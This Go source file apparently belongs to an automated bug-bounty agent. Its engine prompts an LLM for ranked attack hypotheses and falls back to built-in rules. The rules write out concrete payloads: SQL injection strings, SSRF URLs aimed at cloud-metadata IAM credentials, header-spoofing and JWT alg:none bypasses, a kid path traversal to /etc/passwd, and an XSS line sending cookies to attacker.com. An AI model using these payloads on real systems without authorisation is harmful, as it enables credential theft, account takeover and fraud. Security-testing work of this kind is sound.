package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"sort"
	"strings"
	"time"

	"github.com/bb-agent/mirage/internal/agent/base"
	"github.com/bb-agent/mirage/internal/llm"
	"github.com/bb-agent/mirage/internal/models"
)

// AttackHypothesis is a structured attack hypothesis with confidence and kill-chain context.
type AttackHypothesis struct {
	ID           string    `json:"id"`
	Title        string    `json:"title"`
	VulnClass    string    `json:"vuln_class"`   // e.g. "SQLi", "SSRF", "BusinessLogic"
	Target       string    `json:"target"`        // specific endpoint/param
	Premise      string    `json:"premise"`       // why we believe this is vulnerable
	AttackVector string    `json:"attack_vector"` // how to exploit
	KillChain    []string  `json:"kill_chain"`    // steps from initial access to impact
	Impact       string    `json:"impact"`        // business impact if exploited
	Priority     int       `json:"priority"`      // 1-10, higher=test first
	Confidence   float64   `json:"confidence"`    // 0.0-1.0
	ZeroDayRisk  bool      `json:"zero_day_risk"` // true if pattern suggests novel vuln
	Evidence     []string  `json:"evidence"`      // supporting observations
	GeneratedAt  time.Time `json:"generated_at"`
}

// HypothesisEngine generates prioritized attack hypotheses before specialist dispatch.
type HypothesisEngine struct {
	provider llm.Provider
	model    string
}

// NewHypothesisEngine creates a new HypothesisEngine.
func NewHypothesisEngine(provider llm.Provider, model string) *HypothesisEngine {
	return &HypothesisEngine{provider: provider, model: model}
}

// Generate uses multi-step LLM reasoning to produce attack hypotheses from brain state.
func (h *HypothesisEngine) Generate(ctx context.Context, target string, leads []string, tech *TechStack, existingFindings []*base.Finding) ([]AttackHypothesis, error) {
	if h.provider == nil {
		return h.ruleBasedHypotheses(target, leads, tech), nil
	}

	// Build rich context for reasoning
	techJSON := "{}"
	if tech != nil {
		b, _ := json.Marshal(tech)
		techJSON = string(b)
	}

	leadsSummary := strings.Join(leads, "\n- ")
	existingTypes := make([]string, 0, len(existingFindings))
	for _, f := range existingFindings {
		existingTypes = append(existingTypes, f.Type)
	}

	prompt := fmt.Sprintf(`You are a world-class adversarial security researcher performing pre-attack hypothesis generation at Mythos level.

You think like a nation-state threat actor combined with an elite bug bounty hunter. Your hypotheses go beyond OWASP — you actively look for novel/0-day patterns, logic flaws, and chained vulnerabilities.

═══════════════════════════════════════════
TARGET INTELLIGENCE BRIEF
═══════════════════════════════════════════
TARGET URL: %s
TECHNOLOGY PROFILE: %s

RECON SIGNALS:
- %s

CONFIRMED FINDINGS (already known, don't re-hypothesize these):
%v

═══════════════════════════════════════════
ADVERSARIAL REASONING FRAMEWORK
═══════════════════════════════════════════
For each hypothesis, use this multi-step reasoning chain:

STEP 1 — THREAT MODELING
  • What attacker objectives apply? (data exfil, RCE, account takeover, financial fraud)
  • What trust boundaries exist and where might they break?

STEP 2 — ATTACK SURFACE ANALYSIS
  • What specific endpoints, parameters, headers, or flows are implicated?
  • Which parameters cross privilege/auth boundaries?

STEP 3 — EXPLOITATION CHAIN
  • What is the minimal reproduction path from no-auth to impact?
  • Are there chained vulnerabilities (e.g., SSRF→IMDSv1→AWS keys→RCE)?

STEP 4 — ZERO-DAY ASSESSMENT
  • Does this fit a known CVE/CWE pattern, or is it novel?
  • Could this exploit a framework quirk, race condition, or business logic gap?

STEP 5 — IMPACT SCORING
  • What is the real-world business impact if fully exploited?
  • CVSS-style: confidentiality, integrity, availability impact?

═══════════════════════════════════════════
PRIORITY WEIGHTING
═══════════════════════════════════════════
Score highest for:
  • RCE → 10
  • SSRF → Cloud metadata/IAM credential theft → 10
  • SQLi → Full DB dump + auth bypass → 9
  • Auth bypass → Admin access → 9
  • IDOR → PII/financial data → 8
  • Business logic → Financial fraud → 8
  • Novel/0-day pattern → +2 bonus
  • Chained exploitation path → +1 bonus

═══════════════════════════════════════════
OUTPUT FORMAT
═══════════════════════════════════════════
Respond ONLY with a JSON array. No preamble. No markdown.

[{
  "title": "concise attack title (max 60 chars)",
  "vuln_class": "SQLi|XSS|SSRF|RCE|IDOR|AuthBypass|BusinessLogic|Deserialization|SSTI|XXE|LFI|RaceCondition|MassAssignment|JWT|GraphQL|HostHeader|CORS|Smuggling|ParameterPollution|CachePoisoning|0-Day",
  "target": "specific endpoint or parameter (e.g., /api/users?id=, Authorization header)",
  "premise": "why this surface is vulnerable — cite specific recon signals",
  "attack_vector": "exact payload or technique (be specific, not generic)",
  "kill_chain": ["step 1: initial trigger", "step 2: privilege gain", "step 3: impact realization"],
  "impact": "precise business impact with data sensitivity",
  "priority": 1-10,
  "confidence": 0.0-1.0,
  "zero_day_risk": true/false,
  "evidence": ["specific observation from recon that supports this"]
}]

Generate exactly 8-12 hypotheses. Order by (priority × confidence) descending. Prefer chained attacks over single-step findings.`, target, techJSON, leadsSummary, existingTypes)

	resp, err := h.provider.Complete(ctx, llm.CompletionRequest{
		Model: h.model,
		Messages: []models.ChatMessage{
			{Role: "system", Content: "You are an elite adversarial security researcher. Return only valid JSON arrays. No markdown fences, no preamble."},
			{Role: "user", Content: prompt},
		},
		Temperature: 0.45, // Creative adversarial reasoning — slightly higher than standard
	})
	if err != nil {
		return h.ruleBasedHypotheses(target, leads, tech), nil
	}

	// Extract JSON from response
	content := resp.Content
	start := strings.Index(content, "[")
	end := strings.LastIndex(content, "]")
	if start == -1 || end == -1 || end <= start {
		return h.ruleBasedHypotheses(target, leads, tech), nil
	}

	var hypotheses []AttackHypothesis
	if err := json.Unmarshal([]byte(content[start:end+1]), &hypotheses); err != nil {
		return h.ruleBasedHypotheses(target, leads, tech), nil
	}

	// Assign IDs and timestamps
	for i := range hypotheses {
		hypotheses[i].ID = fmt.Sprintf("hyp-%d-%d", time.Now().UnixNano(), i)
		hypotheses[i].GeneratedAt = time.Now()
	}

	// Sort by priority desc
	sort.Slice(hypotheses, func(i, j int) bool {
		return hypotheses[i].Priority > hypotheses[j].Priority
	})

	return hypotheses, nil
}

// RefineSingle refines a hypothesis after specialist attempts, upgrading or downgrading confidence.
func (h *HypothesisEngine) RefineSingle(ctx context.Context, hyp AttackHypothesis, attempt string, succeeded bool) AttackHypothesis {
	if succeeded {
		hyp.Confidence = min64(hyp.Confidence*1.5+0.2, 1.0)
		hyp.Evidence = append(hyp.Evidence, "CONFIRMED: "+attempt)
	} else {
		hyp.Confidence *= 0.7
		hyp.Evidence = append(hyp.Evidence, "FAILED: "+attempt)
	}
	return hyp
}

// ruleBasedHypotheses generates deterministic hypotheses when LLM is unavailable.
// These are based on deterministic signal analysis and cover all major vuln classes.
func (h *HypothesisEngine) ruleBasedHypotheses(target string, leads []string, tech *TechStack) []AttackHypothesis {
	var hyps []AttackHypothesis
	leadsLower := strings.ToLower(strings.Join(leads, " "))
	techLower := ""
	if tech != nil {
		techLower = strings.ToLower(fmt.Sprintf("%s %s %s %v", tech.Lang, tech.DB, tech.Server, tech.Frameworks))
	}
	combined := leadsLower + " " + techLower

	// SQL injection — highest priority
	if tech != nil && tech.DB != "" || strings.ContainsAny(combined, "") ||
		strings.Contains(combined, "sql") || strings.Contains(combined, "id=") ||
		strings.Contains(combined, "query") || strings.Contains(combined, "search") {
		hyps = append(hyps, AttackHypothesis{
			ID: "hyp-sqli-rule", Title: "SQL Injection via Query Parameters",
			VulnClass: "SQLi", Target: target + "?id=1",
			Premise:      "Database-backed application with query parameters — prime SQLi surface",
			AttackVector: "Error-based: ' OR 1=1-- ; Boolean-blind: true vs false condition comparison; Time-blind: SLEEP(5)",
			KillChain:    []string{"Inject ' to trigger syntax error", "Confirm boolean-blind with AND 1=1 vs AND 1=2", "Enumerate information_schema", "Dump credentials table", "Crack or bypass auth"},
			Impact:       "Full database exfiltration, authentication bypass, potential RCE via INTO OUTFILE",
			Priority: 9, Confidence: 0.65, ZeroDayRisk: false,
			Evidence: []string{"Database technology detected", "Numeric/string parameters in URL"},
			GeneratedAt: time.Now(),
		})
	}

	// SSRF — cloud metadata exfil
	if strings.Contains(combined, "url") || strings.Contains(combined, "redirect") ||
		strings.Contains(combined, "fetch") || strings.Contains(combined, "proxy") ||
		strings.Contains(combined, "webhook") || strings.Contains(combined, "callback") ||
		strings.Contains(combined, "load") || strings.Contains(combined, "import") {
		hyps = append(hyps, AttackHypothesis{
			ID: "hyp-ssrf-rule", Title: "SSRF → Cloud Metadata → IAM Credential Theft",
			VulnClass: "SSRF", Target: target,
			Premise:      "URL/redirect/webhook parameters indicate server-side fetch functionality",
			AttackVector: "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ ; url=http://[::]:80/; url=http://0.0.0.0/",
			KillChain:    []string{"Identify URL parameter or webhook endpoint", "Test with http://127.0.0.1", "Escalate to http://169.254.169.254/latest/meta-data/", "Extract IAM role name", "Dump temporary AWS credentials", "Pivot to full AWS account compromise"},
			Impact:       "Cloud credential theft → full infrastructure compromise → data breach",
			Priority: 10, Confidence: 0.7, ZeroDayRisk: false,
			Evidence: []string{"URL-accepting parameters detected in recon"},
			GeneratedAt: time.Now(),
		})
	}

	// IDOR — object reference traversal
	if strings.Contains(combined, "user") || strings.Contains(combined, "account") ||
		strings.Contains(combined, "profile") || strings.Contains(combined, "order") ||
		strings.Contains(combined, "document") || strings.Contains(combined, "resource") {
		hyps = append(hyps, AttackHypothesis{
			ID: "hyp-idor-rule", Title: "IDOR → Cross-Account Data Access",
			VulnClass: "IDOR", Target: target,
			Premise:      "User/account/resource endpoints with object IDs — horizontal privilege escalation surface",
			AttackVector: "Increment/decrement numeric IDs (id=1→id=2), swap UUIDs between sessions, test /api/users/<other-id>/data",
			KillChain:    []string{"Create two test accounts", "Identify resource ID in API response", "Substitute other user's ID in request", "Access unauthorized PII/financial data", "Demonstrate cross-account data exfil"},
			Impact:       "Mass PII exfiltration, account takeover, unauthorized financial data access",
			Priority: 8, Confidence: 0.6, ZeroDayRisk: false,
			Evidence: []string{"User/account endpoints with numeric or UUID identifiers"},
			GeneratedAt: time.Now(),
		})
	}

	// Authentication bypass
	hyps = append(hyps, AttackHypothesis{
		ID: "hyp-authbypass-rule", Title: "Auth Bypass via Trusted Header Injection",
		VulnClass: "AuthBypass", Target: target,
		Premise:      "Web application with access control — IP/role spoofing via trusted headers is a universal attack surface",
		AttackVector: "X-Forwarded-For: 127.0.0.1, X-Original-URL: /admin, X-Custom-IP-Authorization: 127.0.0.1, X-Admin: true",
		KillChain:    []string{"Map auth-protected endpoints (/admin, /api/admin)", "Inject IP-spoofing headers", "Test role escalation headers (X-Role: admin)", "Attempt direct admin URL with X-Original-URL header"},
		Impact:       "Authentication bypass → admin panel access → RCE or full data exfiltration",
		Priority: 7, Confidence: 0.45, ZeroDayRisk: false,
		Evidence: []string{"Standard web application authentication surface"},
		GeneratedAt: time.Now(),
	})

	// JWT vulnerabilities
	if strings.Contains(combined, "jwt") || strings.Contains(combined, "bearer") ||
		strings.Contains(combined, "token") || strings.Contains(combined, "authorization") {
		hyps = append(hyps, AttackHypothesis{
			ID: "hyp-jwt-rule", Title: "JWT Algorithm Confusion / None Algorithm Bypass",
			VulnClass: "JWT", Target: target,
			Premise:      "JWT authentication tokens detected — algorithm confusion is a critical and commonly missed class",
			AttackVector: "alg:none bypass (empty signature); RS256→HS256 confusion using public key; kid injection (kid:../../../../etc/passwd)",
			KillChain:    []string{"Capture JWT from authenticated request", "Decode header and payload", "Set alg:none, strip signature", "Or switch to HS256 and sign with server public key", "Forge admin claims (role:admin, sub:1)"},
			Impact:       "Complete authentication bypass → admin privilege → account takeover at scale",
			Priority: 9, Confidence: 0.6, ZeroDayRisk: true,
			Evidence: []string{"Bearer token / JWT in Authorization header"},
			GeneratedAt: time.Now(),
		})
	}

	// Business logic — financial/workflow abuse
	if strings.Contains(combined, "payment") || strings.Contains(combined, "coupon") ||
		strings.Contains(combined, "discount") || strings.Contains(combined, "order") ||
		strings.Contains(combined, "price") || strings.Contains(combined, "cart") ||
		strings.Contains(combined, "checkout") || strings.Contains(combined, "transfer") {
		hyps = append(hyps, AttackHypothesis{
			ID: "hyp-bizlogic-rule", Title: "Business Logic → Price Manipulation / Negative Value Exploit",
			VulnClass: "BusinessLogic", Target: target,
			Premise:      "E-commerce/payment flow detected — price/quantity manipulation is a critical business logic class",
			AttackVector: "quantity=-1 (negative quantity for credit), price=0.01, coupon reuse via race condition, cart total manipulation",
			KillChain:    []string{"Identify price/quantity parameters", "Test negative values (quantity=-1)", "Test price manipulation (price=0.01)", "Test coupon parallel reuse (race condition)", "Achieve fraudulent purchase or credit"},
			Impact:       "Financial fraud, unlimited coupon exploitation, free merchandise",
			Priority: 8, Confidence: 0.55, ZeroDayRisk: false,
			Evidence: []string{"Payment/e-commerce workflow detected"},
			GeneratedAt: time.Now(),
		})
	}

	// GraphQL
	if strings.Contains(combined, "graphql") || strings.Contains(combined, "/graphql") {
		hyps = append(hyps, AttackHypothesis{
			ID: "hyp-graphql-rule", Title: "GraphQL Introspection + Batching Bruteforce",
			VulnClass: "GraphQL", Target: target,
			Premise:      "GraphQL endpoint detected — introspection leaks schema, batching bypasses rate limits",
			AttackVector: "{__schema{types{name fields{name}}}} for schema dump; batch array of 100 queries to bypass rate limits",
			KillChain:    []string{"Query __schema via introspection", "Map all types and mutations", "Identify sensitive mutations (login, changePassword)", "Batch 100 OTP attempts in single request", "Bypass rate limiting to bruteforce"},
			Impact:       "Schema exposure, OTP/password bruteforce, authentication bypass",
			Priority: 8, Confidence: 0.7, ZeroDayRisk: false,
			Evidence: []string{"GraphQL endpoint in recon"},
			GeneratedAt: time.Now(),
		})
	}

	// XSS — stored/reflected
	if strings.Contains(combined, "comment") || strings.Contains(combined, "search") ||
		strings.Contains(combined, "input") || strings.Contains(combined, "form") ||
		strings.Contains(combined, "query") || strings.Contains(combined, "message") {
		hyps = append(hyps, AttackHypothesis{
			ID: "hyp-xss-rule", Title: "Stored/Reflected XSS → Session Hijack / Credential Theft",
			VulnClass: "XSS", Target: target,
			Premise:      "User-controlled input fields detected — XSS enables session theft and credential harvesting",
			AttackVector: "<script>fetch('https://attacker.com?c='+document.cookie)</script>; <img src=x onerror=alert(document.domain)>",
			KillChain:    []string{"Identify user-controlled reflection points", "Inject polyglot XSS payload", "Confirm execution in browser", "Exfiltrate session cookies to OOB server", "Replay session for account takeover"},
			Impact:       "Session hijacking, credential theft, stored XSS → persistent backdoor in admin panel",
			Priority: 7, Confidence: 0.5, ZeroDayRisk: false,
			Evidence: []string{"User-controlled input fields in recon"},
			GeneratedAt: time.Now(),
		})
	}

	// Sort by priority
	sort.Slice(hyps, func(i, j int) bool { return hyps[i].Priority > hyps[j].Priority })
	return hyps
}

func min64(a, b float64) float64 {
	if a < b {
		return a
	}
	return b
}
